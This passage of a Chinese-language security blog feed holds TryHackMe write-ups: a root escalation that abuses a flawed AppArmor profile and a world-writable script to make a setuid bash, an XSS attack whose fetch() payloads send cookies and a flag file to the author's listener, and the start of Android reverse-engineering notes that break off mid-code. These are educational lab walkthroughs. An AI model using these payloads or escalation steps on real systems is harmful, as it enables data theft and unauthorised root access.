livecodeserver">Attempts <span class="hljs-built_in">to</span> escalate privileges <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> custom binary are hindered <span class="hljs-keyword">by</span> restricted access <span class="hljs-built_in">to</span> critical <span class="hljs-keyword">system</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">directories</span>, necessitating <span class="hljs-keyword">a</span> deeper exploration <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span><span class="hljs-string">&#x27;s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</span><br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ ACL å’Œ SELinux ä»¥åŠ AppArmor</p><p>ï¼ˆç®€å•ä»‹ç»ä¸€ä¸‹ ACL ï¼ŒSELinuxï¼ŒAppArmorï¼šACL æ˜¯è®¿é—®æ§åˆ¶è¡¨ï¼Œæ˜¯ç”±å¾ˆå¤šæ¡â€œdeny|permitâ€ è¯­å¥ç»„æˆï¼Œæ¯ä¸€æ¡éƒ½æ˜¯ ruleï¼Œç”¨äºæ§åˆ¶ç½‘ç»œæµé‡çš„è¿›å‡ºã€‚SELinux æ˜¯ä¸€ä¸ª Linux å†…æ ¸æ¨¡å—ï¼Œä¹Ÿæ˜¯ Linux çš„ä¸€ä¸ªå®‰å…¨å­ç³»ç»Ÿï¼Œä¸ºäº†é™åˆ¶èµ„æºçš„è®¿é—®ã€‚AppArmor æ˜¯ä¸ SELinux ç±»ä¼¼çš„ä¸€ä¸ªè®¿é—®æ§åˆ¶ç³»ç»Ÿï¼Œé€šè¿‡å®ƒå¯ä»¥æŒ‡å®šç¨‹åºçš„è¯»å†™æƒé™ç­‰ç­‰ï¼Œå…¶å®æˆ‘å¹¶ä¸æ˜¯å¾ˆäº†è§£ï¼‰</p><p>é€šè¿‡å‘½ä»¤å¯ä»¥æ£€æµ‹ç³»ç»Ÿæœ‰æ— è¿™äº›å®‰å…¨é…ç½®</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getfacl /opt //æ£€æŸ¥ ACL<br>sestatus//æ£€æŸ¥ SELinux<br>apparmor_status//æ£€æŸ¥ AppArmor<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d33c360805ef71cd.png"></p><p>â€œapparmor module is loaded â€ è¯´æ˜ AppArmor å·²å¯ç”¨ï¼ŒAppArmor ç­–ç•¥ä½äº <code>/etc/apparmor.d/</code> ä¸‹</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥çœ‹ <code>/etc/apparmor.d/usr.sbin.ash</code> å†…å®¹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">cat</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">apparmor.d</span>/<span class="hljs-title">usr.sbin.ash</span></span><br><span class="hljs-function">#<span class="hljs-title">include</span> &lt;<span class="hljs-title">tunables</span>/<span class="hljs-title">global</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">ash</span> <span class="hljs-title">flags</span>=(<span class="hljs-title">complain</span>) &#123;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">base</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">bash</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">consoles</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">nameservice</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">user</span>-<span class="hljs-title">tmp</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Remove</span> <span class="hljs-title">specific</span> <span class="hljs-title">file</span> <span class="hljs-title">path</span> <span class="hljs-title">rules</span></span><br><span class="hljs-function">  # <span class="hljs-title">Deny</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">certain</span> <span class="hljs-title">directories</span></span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/ <span class="hljs-title">r</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">tmp</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">dev</span>/<span class="hljs-title">shm</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Simplified</span> <span class="hljs-title">rule</span> <span class="hljs-title">for</span> <span class="hljs-title">accessing</span> /<span class="hljs-title">home</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function">  <span class="hljs-title">owner</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">rix</span>,</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>ä»”ç»†çœ‹çœ‹å°±ä¼šå‘ç°è¿™ä¸ªé…ç½®æ–‡ä»¶æ˜æ˜¾å­˜åœ¨ç¼ºé™·ï¼Œ<code>/dev/shm</code> å’Œ <code>/dev/tmp</code> ç¼ºå°‘äº†é€šé…ç¬¦ï¼Œå¦‚æœæ²¡æœ‰é€šé…ç¬¦ï¼Œdeny è§„åˆ™ä»…ä»…ä¼šé˜»æ­¢æ›´æ”¹å…·æœ‰è¿™ä¸ªåç§°çš„æ–‡ä»¶ï¼Œä½†ä»–çš„ç›®å½•çš„å†…å®¹ä¸å—å½±å“ï¼Œå…è®¸ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥ <code>/dev/shm</code> å’Œ <code>/var/tmp</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">deny /dev/shm w,<br>deny /var/tmp w,<br></code></pre></td></tr></table></figure><p>ä¹‹å‰è®¿é—® <code>/etc/passwd</code> æ—¶ä¼šå‘ç°</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¤åˆ¶ <code>/bin/bash </code>åˆ° <code>/var/tmp</code> å¹¶è¿è¡Œ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/tmp<br>cp /bin/bash .<br>./bash<br>ls /opt<br></code></pre></td></tr></table></figure><p>ç„¶åç°åœ¨å°±å¯ä»¥è®¿é—® <code>/opt</code> äº†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:/<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span>$ <span class="hljs-title">ls</span> -<span class="hljs-title">al</span> /<span class="hljs-title">opt</span></span><br><span class="hljs-function"><span class="hljs-title">total</span> 20</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span>  3 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Jan</span> 10  2024 .</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span> 18 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 ..</span><br><span class="hljs-function"><span class="hljs-title">drwx</span>--<span class="hljs-title">x</span>--<span class="hljs-title">x</span>  4 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 <span class="hljs-title">containerd</span></span><br><span class="hljs-function">-<span class="hljs-title">rw</span>-<span class="hljs-title">r</span>--<span class="hljs-title">r</span>--  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span>  861 <span class="hljs-title">Dec</span>  7  2023 <span class="hljs-title">dockerfile</span></span><br><span class="hljs-function">-<span class="hljs-title">rwxrwxrwx</span>  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 1715 <span class="hljs-title">Jan</span> 10  2024 <span class="hljs-title">run_container.sh</span></span><br></code></pre></td></tr></table></figure><p>é‡å†™ <code>run_container.sh</code> </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#!/bin/bash<br>cp /bin/bash /var/tmp/Bash<br>chmod +s /var/tmp/Bash<br></code></pre></td></tr></table></figure><p>è¿è¡Œ </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±å·²ç»æ˜¯ root äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/5164206df1860b5c.png"></p><p>è¿è¡Œ Bash</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ebbe8d57c10a4ae.png"></p><p>å¾—åˆ° root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>a<span class="hljs-number">4225</span><span class="hljs-keyword">cc</span><span class="hljs-number">9e85709</span>adda<span class="hljs-number">6</span>ef<span class="hljs-number">55</span>d<span class="hljs-number">6</span>a<span class="hljs-number">4</span>f<span class="hljs-number">2</span>ca<br></code></pre></td></tr></table></figure><p>å…¶å®è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•  <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor?ref=benheater.com#apparmor-shebang-bypass">AppArmor Shebang Bypass</a> å¯ä»¥ç»•è¿‡ AppArmor</p><p>ï¼šï¼‰</p><h1 id="The-Sticker-Shop"><a href="#The-Sticker-Shop" class="headerlink" title="The Sticker Shop"></a>The Sticker Shop</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p><p>Can you read the flag at <code>http://10.10.110.119:8080/flag.txt</code>?</p><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h2 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">110</span>.<span class="hljs-number">119</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f3d31dcd6452d34.png" alt="img"></p><p>å¼€æ”¾äº† 8080 å’Œ 22 ç«¯å£</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>è€æ ·å­ï¼Œè®¿é—® 8080 ç«¯å£ï¼Œä¸€ä¸ªå•†åº—ç½‘ç«™</p><p><img src="https://img.dkdun.cn/v1/2025/12/9cad434d786ac45b.png" alt="img"></p><p>ç›´æ¥è®¿é—® <code>flag.txt</code> ä¼šè¿”å› 401</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">401 Unauthorized<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><img src="https://img.dkdun.cn/v1/2025/12/73127521326842fb.png" alt="img"></p><p>æˆ‘ä»¬èƒ½çœ‹åˆ°æœ‰ä¸€ä¸ª <code>Feedback</code>é¡µé¢ï¼Œåƒ XSSï¼Œä½†æ˜¯è¾“å…¥ payload åæ²¡å›æ˜¾</p><p>å°è¯•ç›´æ¥å¼¹ cookie</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nc ç›‘å¬</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:35480.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> / <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p>ç›´æ¥å‘æœåŠ¡å™¨è¯»å–ä¿¡æ¯åå¼¹åˆ°æœ¬æœºä¸Šï¼Œpayload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://10.10.110.119:8080/flag.txt&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+data);&#125;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>è¿”å›ä¿¡æ¯</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:43650.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> /<span class="hljs-title">THM</span>%7<span class="hljs-title">B83789a69074f636f64a38879cfcabe8b62305ee6</span>%7<span class="hljs-title">D</span> <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>URLdecode ä¸€ä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">THM&#123;<span class="hljs-number">83789</span>a69074f636f64a38879cfcabe8b62305ee6&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AppArmor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Androidå°è®°</title>
    <link href="/2025/02/11/Android%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/02/11/Android%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ SWDD å¸ˆå‚…ï¼ˆAndroid ç¥!ï¼‰ç»™äº†å‡ é“ç®€å•çš„ Android é¢˜ç›®ï¼Œæˆ‘æ‹¿æ¥åšäº†åšï¼Œæ„Ÿè§‰ Android çœŸæœ‰æ„æ€å§hhhhhhå¯æƒœæˆ‘ä¸ä¼šå‘œå‘œå‘œã€‚åšé¢˜æœŸé—´åœ¨ ida çš„æ·±è‰²å’Œæµ…è‰²æ¨¡å¼ä¸‹åå¤æ¨ªè·³ï¼Œæœ€ç»ˆé€‰æ‹©äº†æ·±è‰²ï¼ˆæœç„¶ä¸€å¼€å§‹å¹²æ­£äº‹ä»€ä¹ˆéƒ½å˜å¾—æœ‰è¶£äº†èµ·æ¥ï¼‰</p><span id="more"></span><h1 id="APK-åç¼–è¯‘-level1"><a href="#APK-åç¼–è¯‘-level1" class="headerlink" title="APK åç¼–è¯‘-level1"></a>APK åç¼–è¯‘-level1</h1><p>jeb åç¼–è¯‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4fbcd1524596e6e.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Your_are_go0d_at_Uncompile_Android!&#125;<br></code></pre></td></tr></table></figure><h1 id="Native-å±‚åç¼–è¯‘-level2"><a href="#Native-å±‚åç¼–è¯‘-level2" class="headerlink" title="Native å±‚åç¼–è¯‘-level2"></a><strong>Native å±‚åç¼–è¯‘</strong>-level2</h1><p><code>Native</code>å±‚åç¼–è¯‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—å»æŠŠ <code>so</code> å±‚æå–å‡ºæ¥ï¼Œç”¨ apktool</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d apkå -o <span class="hljs-string">&quot;éœ€è¦ç”Ÿæˆçš„æ–‡ä»¶å¤¹&quot;</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ° <code>\lib\x86_64\libsummertrain.so</code> æ–‡ä»¶ä¸¢å…¥ ida å°±å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/fb79af6175c32845.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Now_You_Know_Native_uncompile&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é™æ€æ³¨å†Œ-level3"><a href="#é™æ€æ³¨å†Œ-level3" class="headerlink" title="é™æ€æ³¨å†Œ-level3"></a><strong>é™æ€æ³¨å†Œ</strong>-level3</h1><p>æå– <code>.so</code> æ–‡ä»¶ä¸¢å…¥ idaï¼Œæ‰¾åˆ° <code>Java_com_swdd_summertrain_MainActivity_Check</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>   ...<br>  v27 = v3;<br>  v5 = <span class="hljs-number">0LL</span>;<br>  v6 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>  &#123;<br>    v7 = v6;<br>    v8 = <span class="hljs-built_in">strlen</span>(v6);<br>    v9 = (<span class="hljs-type">char</span> *)operator new[](v8 + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( !v8 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">8</span> || v9 &lt; &amp;v7[v8] &amp;&amp; v7 &lt; &amp;v9[v8] )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>      v11 = v8 + ~v10;<br>      v12 = v8 &amp; <span class="hljs-number">3</span>;<br>      <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          ++v10;<br>          --v12;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v12 );<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v11 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">1</span>] = v7[v10 + <span class="hljs-number">1</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">2</span>] = v7[v10 + <span class="hljs-number">2</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">3</span>] = v7[v10 + <span class="hljs-number">3</span>] ^ <span class="hljs-number">0x33</span>;<br>          v10 += <span class="hljs-number">4LL</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v8 != v10 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_22:<br>      v26 = v10;<br>      v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8</span>LL;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v9[v26] = *(_QWORD *)&amp;v7[v26] ^ <span class="hljs-number">0x3333333333333333</span>LL;<br>        v26 += <span class="hljs-number">8LL</span>;<br>      &#125;<br>      <span 